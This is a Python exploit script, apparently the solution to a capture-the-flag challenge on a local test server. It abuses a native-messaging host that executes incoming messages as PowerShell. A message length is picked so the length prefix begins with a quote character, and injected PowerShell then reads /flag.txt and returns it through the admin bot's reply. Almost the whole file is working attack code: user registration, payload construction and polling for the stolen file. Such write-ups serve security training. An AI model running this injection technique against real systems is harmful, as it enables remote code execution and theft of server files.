#!/usr/bin/env python3
"""
The native messaging payload (including the length) is passed to the pwsh host
and executed as PowerShell. The native-messaging frame looks like:

    [4-byte little-endian length][JSON payload]

We pick a message length whose size mod 256 is 34, so the wire's length-prefix
first byte is 0x22 (`"`), opening a string that swallows the other prefix
bytes. Then write PowerShell that will encode the flag in a message output
(i.e. has the 4 byte length prefix and JSON payload):

    "<prefix bytes>" | out-null ;                    # suppress that string
    $j = ConvertTo-Json (cat /flag.txt) ;            # JSON-encode the flag
    $b = [Text.Encoding]::UTF8.GetBytes($j) ;
    $s = [Console]::OpenStandardOutput() ;
    $s.Write([BitConverter]::GetBytes($b.Length),0,4) ;   # 4-byte LE length
    $s.Write($b,0,$b.Length)                              # JSON bytes
    #<padding>"                                           # comment out trailing "
"""
import random
import re
import sys
import time

import requests

BASE_URL = "http://localhost:8000"


def build_payload():
    core = (
        "|out-null;"
        "$j=ConvertTo-Json(cat /flag.txt);"
        "$b=[Text.Encoding]::UTF8.GetBytes($j);"
        "$s=[Console]::OpenStandardOutput();"
        "$s.Write([BitConverter]::GetBytes($b.Length),0,4);"
        "$s.Write($b,0,$b.Length)#"
    )
    target = 32
    while target < len(core):
        target += 256
    return core + "#" * (target - len(core))


s = requests.Session()

suffix = random.randint(1000, 9999)
username, password = f"player{suffix}", f"pass{suffix}"

print(f"[*] Registering user: {username}")
r = s.post(f"{BASE_URL}/register", json={"username": username, "password": password})
s.headers["Authorization"] = f"Bearer {r.json()['token']}"
print("[+] Registered")

payload = build_payload()
r = s.post(f"{BASE_URL}/api/message", json={"content": payload})
if r.status_code != 200:
    print(f"[!] Send failed: {r.status_code} {r.text}")
    sys.exit(1)
msg_id = r.json()["message_id"]
print(f"[+] Message #{msg_id} sent")

print("[*] Waiting for admin bot to process...")
for attempt in range(40):
    time.sleep(2)
    r = s.get(f"{BASE_URL}/api/messages")
    if r.status_code != 200:
        continue
    for msg in r.json():
        if msg["id"] == msg_id and msg.get("reply"):
            reply = msg["reply"]
            match = re.search(r"skbdg\{[^}]+\}", reply)
            if match:
                print(f"[+] Flag: {match.group(0)}")
                exit(0)
            print("[!] Reply received but no flag found:")
            print(f"    {reply!r}")
            exit(1)
    if attempt % 5 == 0:
        print(f"    ... waiting (attempt {attempt + 1}/40)")
